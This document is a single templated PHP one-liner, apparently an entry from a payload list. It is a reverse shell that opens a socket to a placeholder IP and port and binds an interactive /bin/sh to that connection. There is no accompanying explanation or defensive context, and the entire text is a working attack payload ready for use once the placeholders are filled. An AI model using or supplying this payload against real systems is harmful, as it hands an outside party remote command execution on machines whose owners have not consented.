php -r '$sock=fsockopen("{{ip}}",{{port}});exec("/bin/sh -i <&3 >&3 2>&3");'
